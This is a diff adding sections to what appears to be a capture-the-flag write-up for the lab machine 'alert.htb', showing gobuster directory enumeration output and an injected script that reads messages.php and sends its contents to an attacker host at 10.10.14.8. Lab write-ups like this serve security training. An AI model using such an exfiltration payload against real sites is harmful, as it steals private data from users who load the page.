@@ -63,3 +63,47 @@ The donate page has a single "number" input but it doesn't seem to do anything. 
 We can modify this and it also changes on the page:
 
 ![modifying the parameter](./images/editing-the-status.png)
+
+## More (hidden) pages
+
+```
+$ gobuster dir --url http://alert.htb/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt
+
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url: http://alert.htb/
+[+] Method: GET
+[+] Threads: 10
+[+] Wordlist: /usr/share/seclists/Discovery/Web-Content/common.txt
+[+] Negative Status codes: 404
+[+] User Agent: gobuster/3.6
+[+] Timeout: 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/.htaccess (Status: 403) [Size: 274]
+/.htpasswd (Status: 403) [Size: 274]
+/.hta (Status: 403) [Size: 274]
+/css (Status: 301) [Size: 304] [--> http://alert.htb/css/]
+/index.php (Status: 302) [Size: 660] [--> index.php?page=alert]
+/messages (Status: 301) [Size: 309] [--> http://alert.htb/messages/]
+/server-status (Status: 403) [Size: 274]
+/uploads (Status: 301) [Size: 308] [--> http://alert.htb/uploads/]
+Progress: 4734 / 4735 (99.98%)
+===============================================================
+Finished
+===============================================================
+```
+
+## Getting the messages
+
+```js
+<script>
+fetch("http://alert.htb/messages.php")
+  .then(response => response.text())
+  .then(data => {
+    fetch("http://10.10.14.8:8000/?data=" + encodeURIComponent(data));
+  });
+</script>
+```
